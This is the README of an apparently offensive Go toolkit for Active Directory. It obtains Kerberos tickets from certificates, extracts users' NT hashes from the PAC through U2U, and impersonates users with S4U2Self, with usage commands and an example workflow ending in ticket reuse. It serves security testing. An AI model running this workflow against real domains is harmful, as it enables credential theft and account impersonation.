# gopkinit

A complete Go implementation of PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) and related attack tools for Active Directory security testing.

## Status: All Three Tools Working

- **gettgtpkinit** - Obtain TGT using X.509 certificate authentication
- **getnthash** - Extract NT hash from PKINIT TGT using U2U authentication
- **gets4uticket** - Perform S4U2Self impersonation to obtain service tickets

## Overview

This project implements RFC 4556 (PKINIT) in Go along with U2U and S4U2Self functionality, providing a complete toolset for certificate-based Kerberos attacks. Unlike `gokrb5`, which lacks PKINIT support, this implementation provides the complete PKINIT layer plus advanced attack capabilities.

## Installation

```bash
# Clone and build all tools
git clone <repo>
cd gopkinit
go build -o gettgtpkinit ./cmd/gettgtpkinit
go build -o getnthash ./cmd/getnthash
go build -o gets4uticket ./cmd/gets4uticket

# Or install directly
go install github.com/ineffectivecoder/gopkinit/cmd/gettgtpkinit@latest
go install github.com/ineffectivecoder/gopkinit/cmd/getnthash@latest
go install github.com/ineffectivecoder/gopkinit/cmd/gets4uticket@latest
```

## Tools

### gettgtpkinit - Certificate-Based TGT Request

Request a TGT using X.509 certificate authentication (PKINIT).

```bash
# Basic usage
./gettgtpkinit -cert-pfx user.pfx DOMAIN.COM/user output.ccache

# With password-protected PFX
./gettgtpkinit -cert-pfx user.pfx -pfx-pass password DOMAIN.COM/user output.ccache

# Specify DC IP address
./gettgtpkinit -cert-pfx user.pfx -dc-ip 10.0.0.1 DOMAIN.COM/user output.ccache

# Through SOCKS5 proxy
./gettgtpkinit -cert-pfx user.pfx -proxy 127.0.0.1:1080 -dc-ip 10.0.0.1 DOMAIN.COM/user output.ccache

# Verbose output
./gettgtpkinit -cert-pfx user.pfx -v DOMAIN.COM/user output.ccache
```

**Output**: Saves TGT to ccache file and prints the AS-REP encryption key (needed for `getnthash`).

### getnthash - NT Hash Extraction via U2U

Extract NT hash from a PKINIT-obtained TGT using User-to-User (U2U) authentication. This works because PKINIT TGTs contain an encrypted PAC_CREDENTIAL_INFO buffer with the user's NT hash.

```bash
./getnthash -ccache user.ccache -key <asrep-key-from-gettgtpkinit> -dc-ip 10.0.0.1
```

**Options**:
- `-ccache` - Path to ccache file containing PKINIT TGT
- `-key` - AS-REP encryption key from gettgtpkinit (hex string)
- `-dc-ip` - IP address of domain controller
- `-v` - Verbose output

**Output**: Prints the recovered NT hash.

### gets4uticket - S4U2Self Impersonation

Obtain a service ticket impersonating another user using S4U2Self. Requires an account with delegation privileges.

```bash
./gets4uticket -ccache admin.ccache -impersonate user@DOMAIN.COM \
  -spn cifs/fileserver.domain.com@DOMAIN.COM -dc-ip 10.0.0.1 -out user_cifs.ccache
```

**Options**:
- `-ccache` - Path to ccache file containing TGT
- `-impersonate` - User to impersonate (format: user@REALM)
- `-spn` - Service principal name (format: service/host@REALM)
- `-dc-ip` - IP address of domain controller
- `-out` - Output ccache file path
- `-v` - Verbose output

**Output**: Saves impersonated service ticket to ccache file.

## Example Workflow

```bash
# Step 1: Get TGT with certificate
$ ./gettgtpkinit -cert-pfx slacker.pfx -dc-ip 10.1.1.10 spinninglikea.top/slacker output.ccache
AS-REP encryption key (you might need this later):
95ba4cf1622f464d4fd5110797d24ea6c12dc0bea44eb19e9bb1242e4abb7207
Saved TGT to file

# Step 2: Extract NT hash from the PKINIT TGT
$ ./getnthash -ccache output.ccache -key 95ba4cf1622f464d4fd5110797d24ea6c12dc0bea44eb19e9bb1242e4abb7207 -dc-ip 10.1.1.10
Recovered NT Hash: a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4

# Step 3: Use TGT with other tools
$ export KRB5CCNAME=output.ccache
$ smbclient.py -k target.domain.com
```

## Features

### gettgtpkinit
- PKINIT Authentication (RFC 4556)
- PFX/PKCS12 certificate loading
- Diffie-Hellman key exchange with static AD-compatible parameters
- Native CMS/PKCS7 signing
- MIT Kerberos ccache v4 output
- AS-REP key export for getnthash
- SOCKS5 proxy support

### getnthash
- User-to-User (U2U) TGS request
- PAC parsing with PAC_CREDENTIAL_INFO extraction
- AES256 decryption of encrypted credentials
- NDR structure parsing for NTLM_SUPPLEMENTAL_CREDENTIAL

### gets4uticket
- S4U2Self (Service-for-User-to-Self) implementation
- RFC 4757 HMAC-MD5 checksum for PA-FOR-USER
- Delegation-based impersonation
- Service ticket output to ccache

## Project Structure

```
gopkinit/
├── cmd/
│   ├── gettgtpkinit/     # TGT retrieval CLI
│   ├── getnthash/        # NT hash extraction CLI
│   └── gets4uticket/     # S4U2Self CLI
├── pkg/
│   ├── cert/             # Certificate loading
│   ├── pkinit/           # PKINIT implementation
│   │   ├── pkinit.go     # Main client
│   │   ├── dh.go         # Diffie-Hellman
│   │   ├── authpack.go   # ASN.1 structures
│   │   ├── cms.go        # CMS/PKCS7 signing
│   │   ├── asreq.go      # AS-REQ builder
│   │   └── asrep.go      # AS-REP decryption
│   ├── krb/              # Kerberos network client
│   │   ├── client.go     # KDC communication
│   │   └── tgs.go        # TGS-REQ/TGS-REP handling
│   ├── ccache/           # MIT ccache file I/O
│   │   ├── ccache.go     # Writer
│   │   └── reader.go     # Reader
│   ├── s4u/              # S4U2Self implementation
│   │   └── s4u.go
│   ├── u2u/              # User-to-User implementation
│   │   └── u2u.go
│   └── pac/              # PAC parsing
│       └── pac.go
```

## Technical Implementation Details

### PKINIT (gettgtpkinit)

The PKINIT implementation handles several complex requirements:

1. **Static Diffie-Hellman Parameters**: Active Directory requires specific 1024-bit DH parameters (not dynamically generated)

2. **ASN.1 Tagging Complexity**: Kerberos uses a mix of implicit and explicit ASN.1 tags requiring careful handling

3. **DH Shared Secret Padding**: `big.Int.Bytes()` strips leading zeros, so shared secrets must be zero-padded to modulus size (128 bytes)

4. **ServerDHNonce Extraction**: The 32-byte nonce in PA_PK_AS_REP uses explicit tags requiring two-step parsing

### S4U2Self (gets4uticket)

The S4U2Self implementation includes:

1. **RFC 4757 HMAC-MD5 Checksum**: PA-FOR-USER requires the Kerberos HMAC-MD5 algorithm (not plain HMAC-MD5):
   - `ksign = HMAC-MD5(key, "signaturekey\x00")`
   - `md5hash = MD5(usage_str(keyusage) + data)`
   - `checksum = HMAC-MD5(ksign, md5hash)`

2. **Key Usage 17**: The S4U checksum uses key usage 17 per MS-SFU specification

### U2U/NT Hash Extraction (getnthash)

The U2U implementation extracts NT hashes from PKINIT TGTs:

1. **U2U TGS Request**: Request a ticket to ourselves with `enc_tkt_in_skey` flag set

2. **PAC Parsing**: Parse the PAC structure to find PAC_CREDENTIAL_INFO (type 2)

3. **Credential Decryption**: Decrypt the PAC_CREDENTIAL_INFO using the AS-REP key with key usage 16

4. **NDR Parsing**: Parse the NDR-encoded PAC_CREDENTIAL_DATA to extract NTLM_SUPPLEMENTAL_CREDENTIAL

## Library Usage

```go
import "github.com/ineffectivecoder/gopkinit/pkg/pkinit"

// Load certificate from PFX
client, err := pkinit.NewFromPFX("user.pfx", "password")
if err != nil {
    log.Fatal(err)
}

// Request TGT (last parameter is SOCKS5 proxy, empty string for no proxy)
result, err := client.GetTGT("DOMAIN.COM", "user", "dc.domain.com", "")
if err != nil {
    log.Fatal(err)
}

// Use result.ASRepKey for getnthash
fmt.Println("AS-REP Key:", result.ASRepKey)
```

## Dependencies

```go
require (
    github.com/jcmturner/gokrb5/v8           // Kerberos structures
    software.sslmate.com/src/go-pkcs12       // PKCS12 parsing
    golang.org/x/net/proxy                   // SOCKS5 support
    golang.org/x/crypto                      // Crypto primitives
)
```

## Known Limitations

- PEM certificate format not yet supported (use PFX)
- RC4 encryption not supported (AES256/AES128 only)
- No smart card/hardware token support
- S4U2Proxy not yet implemented

## References

- [RFC 4556 - PKINIT](https://datatracker.ietf.org/doc/html/rfc4556)
- [RFC 4757 - RC4-HMAC Kerberos Encryption](https://datatracker.ietf.org/doc/html/rfc4757)
- [MS-SFU - S4U Extensions](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/)
- [MS-PAC - PAC Data Structure](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/)
- [PKINITtools](https://github.com/dirkjanm/PKINITtools) by @_dirkjan
- [minikerberos](https://github.com/skelsec/minikerberos) by @skelsec
- [gokrb5](https://github.com/jcmturner/gokrb5)

## License

Based on PKINITtools by Dirk-jan Mollema (@_dirkjan) and minikerberos by Tamas Jos (@skelsec).
